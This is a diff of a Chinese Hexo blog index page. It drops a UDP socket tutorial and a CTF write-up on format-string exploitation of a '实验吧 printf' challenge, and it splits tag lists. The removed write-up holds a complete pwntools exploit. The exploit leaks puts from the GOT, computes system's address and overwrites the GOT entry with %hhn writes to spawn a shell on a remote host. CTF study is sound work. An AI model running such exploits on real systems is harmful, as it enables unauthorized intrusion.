-<h5 id="2-UDP编程-1"><a href="#2-UDP编程-1" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment">#绑定端口:</span></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.bind((host,port))</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'Bind UDP on 55555'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不需要建立连接，直接接收数据</span></span><br><span class="line"><span class="comment">#s.recvfrom()拿到发送的信息与谁发的(地址与端口)</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  (<span class="string">'Received from %s:%s'</span>  %  addr)</span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Hello,%s'</span>  %  data,addr)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
-<p>测试服务器的客户端程序如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"></span><br><span class="line">s.sendto(<span class="string">b'testServer'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
+<p><strong>运行结果</strong>如下：<br><img src="/2019/09/10/格式化字符串漏洞利用/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
 
       
 
@@ -448,7 +545,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">格式化字符串</a>
         		</li>
       		
 		</ul>
@@ -458,7 +559,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Python网络编程/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/格式化字符串漏洞利用/">展开全文 >></a>
         </p>
       
 
@@ -525,7 +626,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn,栈,溢出</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">溢出</a>
         		</li>
       		
 		</ul>
@@ -619,91 +728,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/09/10/输入表重建工具ImportREC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-格式化字符串漏洞利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/格式化字符串漏洞利用/">格式化字符串漏洞利用</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h3><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
-<ol>
-<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
-<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
-<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/格式化字符串漏洞利用/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
-</ol>
-<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
-<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
-<p><strong>exp</strong>如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">puts_file</span><span class="params">(io,  name,content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'put'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'upload:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">get_file</span><span class="params">(io,  name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'get'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'get:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">dir_file</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'dir'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'Start!'</span></span><br><span class="line">    fake_username  =  <span class="string">'sysbdmin'</span></span><br><span class="line">    real_username  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#计算出真实的用户名</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  fake_username:</span><br><span class="line">        real_username  +=  chr(ord(i)  -  <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Name (ftp.hacker.server:Rainism):'</span>)</span><br><span class="line">    io.sendline(real_username)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] real_username : '</span>,real_username</span><br><span class="line">    <span class="comment">#得到puts的got表地址</span></span><br><span class="line">    got_puts  =  <span class="number">0x0804a028</span></span><br><span class="line">    <span class="comment">#得到puts的偏移量</span></span><br><span class="line">    offset_puts  =  <span class="number">0x5fca0</span></span><br><span class="line">    content  =  p32(got_puts)  +  <span class="string">'%7$s...'</span></span><br><span class="line">    <span class="comment">#构造之后system调用的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/sh'</span></span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="comment">#利用printf的格式化字符串漏洞打印出真实的puts地址</span></span><br><span class="line">    data  =  io.recvuntil(<span class="string">'...'</span>)[<span class="number">0</span>:]</span><br><span class="line">    addr_puts  =  u32(data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_puts: '</span>,hex(addr_puts)</span><br><span class="line">    <span class="comment">#计算libc的基址</span></span><br><span class="line">    addr_libc  =  addr_puts  -  offset_puts</span><br><span class="line">    offset_system  =  <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment">#计算system的真实地址</span></span><br><span class="line">    addr_system  =  addr_libc  +  offset_system</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system: '</span>,hex(addr_system)</span><br><span class="line"></span><br><span class="line">    addr_info  =  <span class="string">''</span></span><br><span class="line">    padding_info  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#覆盖puts的got表地址</span></span><br><span class="line">    system_addr_buff  =  p32(addr_system)</span><br><span class="line">    begin_index  =  <span class="number">7</span></span><br><span class="line">    offset  =  <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  range(<span class="number">4</span>):</span><br><span class="line">        addr_info  +=  p32(got_puts  +  i)</span><br><span class="line">        val  =  ord(system_addr_buff[i])</span><br><span class="line">        count  =  val  -  offset</span><br><span class="line">        <span class="keyword">if</span>  count  &lt;  <span class="number">0</span>  :</span><br><span class="line">            count  +=  <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        padding_info  +=  <span class="string">'%%%dc'</span>  %  count  +  <span class="string">'%%%d$hhn'</span>  %  (begin_index  +  i)</span><br><span class="line"></span><br><span class="line">        offset  =  val</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start Attacking!'</span></span><br><span class="line">    <span class="comment">#与之前创建的文件名组成了system的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/bin'</span></span><br><span class="line">    content  =  addr_info  +  padding_info</span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] puts_file succeed!'</span></span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] get_file succeed!'</span></span><br><span class="line">    dir_file(io)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] dir_file succeed!'</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    io  =  remote(<span class="string">'106.2.25.7'</span>,<span class="number">8001</span>)</span><br><span class="line">    pwn(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p><strong>运行结果</strong>如下：<br><img src="/2019/09/10/格式化字符串漏洞利用/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn,格式化字符串</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/格式化字符串漏洞利用/">展开全文 >></a>
         </p>
       
 
@@ -830,7 +854,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">pwn,格式化字符串</a>
+                <a href="javascript:void(0)" class="js-tag color4">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">格式化字符串</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">栈</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">溢出</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -838,23 +874,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">pwn,栈,溢出</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">pwn,python</a>
+                <a href="javascript:void(0)" class="js-tag color4">ROP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pwn,ROP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">pwn,ROP,ret2dlresolve</a>
+                <a href="javascript:void(0)" class="js-tag color4">ret2dlresolve</a>
               </li>
              
               <li class="article-tag-list-item">
